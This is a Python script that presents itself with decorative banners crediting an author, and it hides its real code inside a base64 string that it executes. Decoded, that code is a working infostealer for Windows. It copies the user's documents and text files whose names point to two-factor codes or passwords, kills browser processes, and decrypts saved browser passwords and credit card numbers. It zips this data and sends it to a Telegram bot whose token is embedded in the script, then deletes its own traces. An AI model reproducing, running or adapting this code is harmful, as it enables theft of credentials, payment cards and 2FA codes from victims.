import os, random, time, sqlite3, shutil, requests
import zipfile, json, psutil, base64, getpass
import subprocess, xml.etree.ElementTree as ET
import winreg as reg, threading, asyncio, ctypes

from Crypto.Cipher import AES
from ctypes import wintypes
from ctypes.wintypes import BOOL, DWORD, LPVOID, LPCWSTR
from urllib.request import urlopen, Request
from json import loads as json_loads, load
from datetime import datetime
from datetime import datetime, timedelta
from json import loads
from pathlib import Path
from telebot import TeleBot, types

i = '''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó

   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë
   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ï¶‚ïù‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë
   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë
   ‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ï¶‚ïù‚ñà‚ñà‚ïë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
   ‚ïö‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë
   
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
'''

r = '''
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ùêïùêíùêóùêó - ùêÅùêò: @ùêëùüéùêÅùêåùüé ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
'''

import base64
exec(base64.b64decode('dXNlciA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCnVzZXJuYW1lID0gb3MuZ2V0ZW52KCJVU0VSTkFNRSIpCnVzZXJfbmFtZSA9IG9zLmdldGxvZ2luKCkKCkJPVF9UT0tFTiA9ICI2NjUwNTA1MjQyOkFBRzVwMWRLZ0V0V1JHOHVMT2pPbnptYmc4aTZDRDBOTG9VIgpDSEFUX0lEID0gLTEwMDE5MzMxMDI3ODAKVVNFUl9UTEdfSUQgPSAxOTcyNTA1MjkzCgpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCnVfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcigifiIpLCAiR29vZ2xlIikKCmFycm93ID0gIiDinqQgIgpzID0gIlxuIgoKZGVmIGNyZWF0ZV9mb2xkZXIoZm9sZGVyX3BhdGgpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGZvbGRlcl9wYXRoKToKICAgICAgICBvcy5tYWtlZGlycyhmb2xkZXJfcGF0aCwgZXhpc3Rfb2s9VHJ1ZSkKCmNyZWF0ZV9mb2xkZXIodV9mb2xkZXIpCgpkZWYgc2hvd19maWxlcygpOgogICAgdHJ5OgogICAgICAgIHJlZ2lzdHJ5X3BhdGggPSByIlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXEFkdmFuY2VkIgogICAgICAgIGtleV9uYW1lID0gIkhpZGRlbiIKCiAgICAgICAgd2l0aCByZWcuT3BlbktleShyZWcuSEtFWV9DVVJSRU5UX1VTRVIsIHJlZ2lzdHJ5X3BhdGgsIDAsIHJlZy5LRVlfU0VUX1ZBTFVFKSBhcyBrZXk6CiAgICAgICAgICAgIHJlZy5TZXRWYWx1ZUV4KGtleSwga2V5X25hbWUsIDAsIHJlZy5SRUdfRFdPUkQsIDEpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKICAgIApzaG93X2ZpbGVzKCkKCmZvbGRlcnMgPSBbICAgIAogICAgb3MucGF0aC5qb2luKHVzZXIsICJEb3dubG9hZHMiKSwgCiAgICBvcy5wYXRoLmpvaW4odXNlciwgIk9uZURyaXZlIiwgIkRvY3VtZW50cyIpLAogICAgb3MucGF0aC5qb2luKHVzZXIsICJEb2N1bWVudHMiKSwgCiAgICBvcy5wYXRoLmpvaW4odXNlciwgIk9uZURyaXZlIiwgIkRvY3VtZW50b3MiKSwKICAgIG9zLnBhdGguam9pbih1c2VyLCAiRG9jdW1lbnRvcyIpLCAKICAgIG9zLnBhdGguam9pbih1c2VyLCAiT25lRHJpdmUiLCAiRXNjcml0b3JpbyIpLAogICAgb3MucGF0aC5qb2luKHVzZXIsICJPbmVEcml2ZSIsICJEZXNrdG9wIiksCiAgICBvcy5wYXRoLmpvaW4odXNlciwgIkRlc2t0b3AiKSwKICAgIG9zLnBhdGguam9pbih1c2VyLCAiRXNjcml0b3JpbyIpLApdCgpmaWxlX3NlYXJjaCA9IHsiMmZhIiwgImJhY2t1cCIsICJ0d28iLCAiZmFjdG9yIiwgImNvZGVzIiwgImNvZGUiLCAicGFzc3dvcmRzIn0KZXh0ZW5zaW9ucyA9ICgnLmRvY3gnLCAnLnhsc3gnLCAnLnBwdHgnLCAnLnBkZicsICcuY3N2JykKCmRlZiBzZWFyY2hfZmlsZXMoZmlsZW5hbWUpOgogICAgZmlsZW5hbWVfbG93ZXIgPSBmaWxlbmFtZS5sb3dlcigpCiAgICByZXR1cm4gYW55KGtleXdvcmQgaW4gZmlsZW5hbWVfbG93ZXIgZm9yIGtleXdvcmQgaW4gZmlsZV9zZWFyY2gpCgpmb3IgZm9sZGVyIGluIGZvbGRlcnM6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZm9sZGVyKToKICAgICAgICBjb250aW51ZQogICAgCiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2Fsayhmb2xkZXIpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGZpbGUubG93ZXIoKS5lbmRzd2l0aCgnLnR4dCcpIGFuZCBzZWFyY2hfZmlsZXMoZmlsZSk6CiAgICAgICAgICAgICAgICBzaHV0aWwuY29weShmaWxlX3BhdGgsIHVfZm9sZGVyKQogICAgICAgICAgICBlbGlmIGZpbGUubG93ZXIoKS5lbmRzd2l0aChleHRlbnNpb25zKToKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5KGZpbGVfcGF0aCwgdV9mb2xkZXIpCgpkZWYgY2xvc2VfYnJvd3NlcnMoKToKICAgIGJyb3NlcnMgPSBbImNocm9tZSIsICJmaXJlZm94IiwgIm1zZWRnZSIsICJpZXhwbG9yZSIsICJvcGVyYSIsICJvcGVyYWd4Il0KCiAgICB0cnk6CiAgICAgICAgZm9yIGJyb3dzZXIgaW4gYnJvc2VyczoKICAgICAgICAgICAgZm9yIHByb2Nlc3MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcihbJ3BpZCcsICduYW1lJ10pOgogICAgICAgICAgICAgICAgaWYgcHJvY2Vzcy5pbmZvWyduYW1lJ10gYW5kIGJyb3dzZXIubG93ZXIoKSBpbiBwcm9jZXNzLmluZm9bJ25hbWUnXS5sb3dlcigpOgogICAgICAgICAgICAgICAgICAgIHBpZCA9IHByb2Nlc3MuaW5mb1sncGlkJ10KICAgICAgICAgICAgICAgICAgICBwcm9jZXNzID0gcHN1dGlsLlByb2Nlc3MocGlkKQogICAgICAgICAgICAgICAgICAgIHByb2Nlc3MudGVybWluYXRlKCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCiAgICAKZGVmIGJsb2NrX2Jyb3dzZXJzKHRfYj0xMCk6CiAgICB0X2kgPSB0aW1lLnRpbWUoKQoKICAgIHdoaWxlIHRpbWUudGltZSgpIC0gdF9pIDwgdF9iOgogICAgICAgIGNsb3NlX2Jyb3dzZXJzKCkKICAgICAgICB0aW1lLnNsZWVwKDIpICAKCmJsb2NrX2Jyb3dzZXJzKCkKCmJyb3dzZXJzID0gewogICAgJ0F2YXN0JzogbG9jYWwgKyAnXFxBVkFTVFxcU29mdHdhcmUgQnJvd3NlclxcVXNlciBEYXRhJywgIAogICAgJ0Nocm9tZSc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YScsCiAgICAnRWRnZSc6IGxvY2FsICsgJ1xcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGEnLAogICAgJ0JyYXZlJzogbG9jYWwgKyAnXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGEnLAp9CgpkYXRhX3F1ZXJpZXMgPSB7CiAgICAnUGFzc3dvcmRzJzogewogICAgICAgICdxdWVyeSc6ICdTRUxFQ1Qgb3JpZ2luX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zJywKICAgICAgICAnZmlsZSc6ICdcXExvZ2luIERhdGEnLAogICAgICAgICdjb2x1bW5zJzogWydVUkwnLCAnVXNlcicsICdQYXNzd29yZCddLAogICAgICAgICdkZWNyeXB0JzogVHJ1ZQogICAgfSwKICAgICdDcmVkaXQgQ2FyZHMnOiB7CiAgICAgICAgJ3F1ZXJ5JzogJ1NFTEVDVCBuYW1lX29uX2NhcmQsIGV4cGlyYXRpb25fbW9udGgsIGV4cGlyYXRpb25feWVhciwgY2FyZF9udW1iZXJfZW5jcnlwdGVkLCBkYXRlX21vZGlmaWVkIEZST00gY3JlZGl0X2NhcmRzJywKICAgICAgICAnZmlsZSc6ICdcXFdlYiBEYXRhJywKICAgICAgICAnY29sdW1ucyc6IFsnTmFtZScsICdNb250aCcsICdZZWFyJywgJ0NhcmQgTnVtYmVyJ10sCiAgICAgICAgJ2RlY3J5cHQnOiBUcnVlCiAgICB9LAogICAgJ0hpc3RvcnknOiB7CiAgICAgICAgJ3F1ZXJ5JzogJ1NFTEVDVCB1cmwsIHRpdGxlIEZST00gdXJscycsCiAgICAgICAgJ2ZpbGUnOiAnXFxIaXN0b3J5JywKICAgICAgICAnY29sdW1ucyc6IFsnVVJMJywgJ1RpdGxlJ10sCiAgICAgICAgJ2RlY3J5cHQnOiBGYWxzZQogICAgfSwKICAgICdEb3dubG9hZHMnOiB7CiAgICAgICAgJ3F1ZXJ5JzogJ1NFTEVDVCB0YWJfdXJsLCB0YXJnZXRfcGF0aCBGUk9NIGRvd25sb2FkcycsCiAgICAgICAgJ2ZpbGUnOiAnXFxIaXN0b3J5JywKICAgICAgICAnY29sdW1ucyc6IFsnVVJsJywgJ1BhdGgnXSwKICAgICAgICAnZGVjcnlwdCc6IEZhbHNlCiAgICB9LAp9CgpjcnlwdDMyID0gY3R5cGVzLndpbmRsbC5jcnlwdDMyCgpjbGFzcyBEQVRBX0JMT0IoY3R5cGVzLlN0cnVjdHVyZSk6CiAgICBfZmllbGRzXyA9IFsoImNiRGF0YSIsIHdpbnR5cGVzLkRXT1JEKSwKICAgICAgICAgICAgICAgICgicGJEYXRhIiwgY3R5cGVzLlBPSU5URVIoY3R5cGVzLmNfYnl0ZSkpXQoKY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEuYXJndHlwZXMgPSBbY3R5cGVzLlBPSU5URVIoREFUQV9CTE9CKSwgY3R5cGVzLlBPSU5URVIod2ludHlwZXMuTFBXU1RSKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLlBPSU5URVIoREFUQV9CTE9CKSwgY3R5cGVzLmNfdm9pZF9wLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdHlwZXMuY192b2lkX3AsIHdpbnR5cGVzLkRXT1JELAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdHlwZXMuUE9JTlRFUihEQVRBX0JMT0IpXQpjcnlwdDMyLkNyeXB0VW5wcm90ZWN0RGF0YS5yZXN0eXBlID0gd2ludHlwZXMuQk9PTAoKZGVmIGRhdGFfdG9fYmxvYihkYXRhKToKICAgIGJsb2IgPSBEQVRBX0JMT0IoKQogICAgYmxvYi5jYkRhdGEgPSBsZW4oZGF0YSkKICAgIGJsb2IucGJEYXRhID0gY3R5cGVzLmNhc3QoY3R5cGVzLmNyZWF0ZV9zdHJpbmdfYnVmZmVyKGRhdGEpLCBjdHlwZXMuUE9JTlRFUihjdHlwZXMuY19ieXRlKSkKICAgIHJldHVybiBibG9iCgpkZWYgQ3J5cHRVbnByb3RlY3REYXRhKGRhdGEsIGVudHJvcHksIHJlc2VydmVkLCBwcm9tcHQsIGZsYWdzKToKICAgIGluX2RhdGEgPSBkYXRhX3RvX2Jsb2IoZGF0YSkKICAgIG91dF9kYXRhID0gREFUQV9CTE9CKCkKICAgIGRlc2NyaXB0aW9uID0gd2ludHlwZXMuTFBXU1RSKCkKICAgIAogICAgcmVzdWx0ID0gY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoCiAgICAgICAgY3R5cGVzLmJ5cmVmKGluX2RhdGEpLAogICAgICAgIGN0eXBlcy5ieXJlZihkZXNjcmlwdGlvbiksCiAgICAgICAgZW50cm9weSwKICAgICAgICByZXNlcnZlZCwKICAgICAgICBwcm9tcHQsCiAgICAgICAgZmxhZ3MsCiAgICAgICAgY3R5cGVzLmJ5cmVmKG91dF9kYXRhKQogICAgKQogICAgCiAgICBpZiBub3QgcmVzdWx0OgogICAgICAgIHJhaXNlIGN0eXBlcy5XaW5FcnJvcigpCiAgICAKICAgIGRlY3J5cHRlZF9kYXRhID0gY3R5cGVzLnN0cmluZ19hdChvdXRfZGF0YS5wYkRhdGEsIG91dF9kYXRhLmNiRGF0YSkKICAgIHJldHVybiBkZXNjcmlwdGlvbi52YWx1ZSwgZGVjcnlwdGVkX2RhdGEKCmJsb2NrX2Jyb3dzZXJzKCkKCmRlZiBnZXRfbWFzdGVyX2tleShwYXRoOiBzdHIpOgogICAgdHJ5OgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIGlmICdvc19jcnlwdCcgbm90IGluIG9wZW4ocGF0aCArICJcXExvY2FsIFN0YXRlIiwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKS5yZWFkKCk6CiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIG9wZW4ocGF0aCArICJcXExvY2FsIFN0YXRlIiwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBjID0gZi5yZWFkKCkKICAgICAgICBsb2NhbF9zdGF0ZSA9IGpzb24ubG9hZHMoYykKCiAgICAgICAga2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQogICAgICAgIGtleSA9IGtleVs1Ol0KICAgICAgICBrZXkgPSBDcnlwdFVucHJvdGVjdERhdGEoa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQogICAgICAgIHJldHVybiBrZXkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmV0dXJuIE5vbmUKCmRlZiBkZWNyeXB0X3Bhc3N3b3JkKGJ1ZmY6IGJ5dGVzLCBrZXk6IGJ5dGVzKSAtPiBzdHI6CiAgICBpdiA9IGJ1ZmZbMzoxNV0KICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgIGNpcGhlciA9IEFFUy5uZXcoa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQoKICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwoKYmxvY2tfYnJvd3NlcnMoKQoKZGVmIHNhdmVfcmVzdWx0cyhicm93c2VyX25hbWUsIHR5cGVfb2ZfZGF0YSwgY29udGVudCk6CiAgICBicm93c2VyID0gb3MucGF0aC5qb2luKHVfZm9sZGVyLCAiQnJvd3NlcnMiLCBicm93c2VyX25hbWUpCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoYnJvd3Nlcik6CiAgICAgICAgb3MubWFrZWRpcnMoYnJvd3NlciwgZXhpc3Rfb2s9VHJ1ZSkKICAgIAogICAgaWYgY29udGVudCBpcyBub3QgTm9uZToKICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oYnJvd3NlciwgZiJ7dHlwZV9vZl9kYXRhfS50eHQiKQogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICd3JywgZW5jb2Rpbmc9InV0Zi04IikgYXMgZmlsZToKICAgICAgICAgICAgZmlsZS53cml0ZShpLnN0cmlwKCkgKyAiXG5cbiIgKyBjb250ZW50KQoKZGVmIGdldF9kYXRhKHBhdGg6IHN0ciwgcHJvZmlsZTogc3RyLCBrZXksIHR5cGVfb2ZfZGF0YSk6CiAgICB0cnk6CiAgICAgICAgZGJfZmlsZSA9IGYne3BhdGh9XFx7cHJvZmlsZX17dHlwZV9vZl9kYXRhWyJmaWxlIl19JwogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhkYl9maWxlKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgcmVzdWx0ID0gIiIKICAgICAgICBzaHV0aWwuY29weShkYl9maWxlLCAndGVtcF9kYicpCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdCgndGVtcF9kYicpCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgIGN1cnNvci5leGVjdXRlKHR5cGVfb2ZfZGF0YVsncXVlcnknXSkKICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICByb3cgPSBsaXN0KHJvdykKICAgICAgICAgICAgaWYgdHlwZV9vZl9kYXRhWydkZWNyeXB0J106CiAgICAgICAgICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4ocm93KSk6CiAgICAgICAgICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShyb3dbaV0sIGJ5dGVzKToKICAgICAgICAgICAgICAgICAgICAgICAgcm93W2ldID0gZGVjcnlwdF9wYXNzd29yZChyb3dbaV0sIGtleSkKICAgICAgICAgICAgaWYgZGF0YV90eXBlX25hbWUgPT0gJ2hpc3RvcnknOgogICAgICAgICAgICAgICAgaWYgcm93WzJdICE9IDA6CiAgICAgICAgICAgICAgICAgICAgcm93WzJdID0gY29udmVydF9jaHJvbWVfdGltZShyb3dbMl0pCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHJvd1syXSA9ICIwIgogICAgICAgICAgICByZXN1bHQgKz0gIlxuIi5qb2luKFtmIntjb2x9OiB7dmFsfSIgZm9yIGNvbCwgdmFsIGluIHppcCh0eXBlX29mX2RhdGFbJ2NvbHVtbnMnXSwgcm93KV0pICsgIlxuXG4iCiAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgb3MucmVtb3ZlKCd0ZW1wX2RiJykKICAgICAgICByZXR1cm4gcmVzdWx0CiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJldHVybiBOb25lCgpibG9ja19icm93c2VycygpCgpkZWYgY29udmVydF9jaHJvbWVfdGltZShjaHJvbWVfdGltZSk6CiAgICByZXR1cm4gKGRhdGV0aW1lKDE2MDEsIDEsIDEpICsgdGltZWRlbHRhKG1pY3Jvc2Vjb25kcz1jaHJvbWVfdGltZSkpLnN0cmZ0aW1lKCclZC8lbS8lWSAlSDolTTolUycpCgpkZWYgaW5zdGFsbGVkX2Jyb3dzZXJzKCk6CiAgICBhdmFpbGFibGUgPSBbXQogICAgZm9yIHggaW4gYnJvd3NlcnMua2V5cygpOgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGJyb3dzZXJzW3hdKToKICAgICAgICAgICAgYXZhaWxhYmxlLmFwcGVuZCh4KQogICAgcmV0dXJuIGF2YWlsYWJsZQoKYXZhaWxhYmxlX2Jyb3dzZXJzID0gaW5zdGFsbGVkX2Jyb3dzZXJzKCkKCmJsb2NrX2Jyb3dzZXJzKCkKCmZvciBicm93c2VyIGluIGF2YWlsYWJsZV9icm93c2VyczoKICAgIGJyb3dzZXJfcGF0aCA9IGJyb3dzZXJzW2Jyb3dzZXJdCiAgICBtYXN0ZXJfa2V5ID0gZ2V0X21hc3Rlcl9rZXkoYnJvd3Nlcl9wYXRoKQoKICAgIGZvciBkYXRhX3R5cGVfbmFtZSwgZGF0YV90eXBlIGluIGRhdGFfcXVlcmllcy5pdGVtcygpOgogICAgICAgIGRhdGEgPSBnZXRfZGF0YShicm93c2VyX3BhdGgsICJEZWZhdWx0IiwgbWFzdGVyX2tleSwgZGF0YV90eXBlKQogICAgICAgIHNhdmVfcmVzdWx0cyhicm93c2VyLCBkYXRhX3R5cGVfbmFtZSwgZGF0YSkKCmFzeW5jIGRlZiBjcmVhdGVfemlwKHVfZm9sZGVyKToKICAgIHVzZXIgPSBvcy5nZXRsb2dpbigpCgogICAgbm93ID0gZGF0ZXRpbWUubm93KCkKICAgIHppcF9maWxlbmFtZSA9IGYiUk9CTU9be25vdy5kYXk6MDJkfV1be3VzZXJ9XVt7bm93LnNlY29uZDowMmR9XS56aXAiCgogICAgemlwX2ZpbGVwYXRoID0gb3MucGF0aC5qb2luKCJDOlxcVXNlcnMiLCB1c2VyLCAiRG93bmxvYWRzIiwgemlwX2ZpbGVuYW1lKQoKICAgIHRyeToKICAgICAgICBzaHV0aWwubWFrZV9hcmNoaXZlKHppcF9maWxlcGF0aFs6LTRdLCAnemlwJywgdV9mb2xkZXIpCiAgICAgICAgcmV0dXJuIHppcF9maWxlcGF0aAogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKICAgICAgICByZXR1cm4gTm9uZSAgICAKICAgIAphc3luYyBkZWYgc2VuZF96aXBfdG9fdGVsZWdyYW0oemlwX2ZpbGVwYXRoLCBib3RfdG9rZW4sIGNoYXRfaWQpOgogICAgYm90ID0gVGVsZUJvdChib3RfdG9rZW4pCgogICAgdHJ5OgogICAgICAgIHVzZXJfbWVzc2FnZSA9IGYiVXNlcjoge3VzZXJfbmFtZX0iCiAgICAgICAgCiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjaGF0X2lkLCB1c2VyX21lc3NhZ2UpCgogICAgICAgIHdpdGggb3Blbih6aXBfZmlsZXBhdGgsICdyYicpIGFzIHppcF9maWxlOgogICAgICAgICAgICBib3Quc2VuZF9kb2N1bWVudChjaGF0X2lkLCB6aXBfZmlsZSkKCiAgICAgICAgc2VwYXJhdG9yX21lc3NhZ2UgPSAi4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZCwgc2VwYXJhdG9yX21lc3NhZ2UpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKCmFzeW5jIGRlZiBtYWluKCk6CiAgICB6aXBfZmlsZXBhdGggPSBhd2FpdCBjcmVhdGVfemlwKHVfZm9sZGVyKQogICAgaWYgemlwX2ZpbGVwYXRoOgogICAgICAgIGF3YWl0IHNlbmRfemlwX3RvX3RlbGVncmFtKHppcF9maWxlcGF0aCwgQk9UX1RPS0VOLCBDSEFUX0lEKQogICAgICAgIGF3YWl0IHNlbmRfemlwX3RvX3RlbGVncmFtKHppcF9maWxlcGF0aCwgQk9UX1RPS0VOLCBVU0VSX1RMR19JRCkKICAgICAgICBvcy5yZW1vdmUoemlwX2ZpbGVwYXRoKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGFzeW5jaW8ucnVuKG1haW4oKSkKCmRlZiBkZWxldGUoKToKICAgIHRyeToKICAgICAgICBzaHV0aWwucm10cmVlKHVfZm9sZGVyKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHBhc3MKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCmRlbGV0ZSgp').decode('utf-8'))
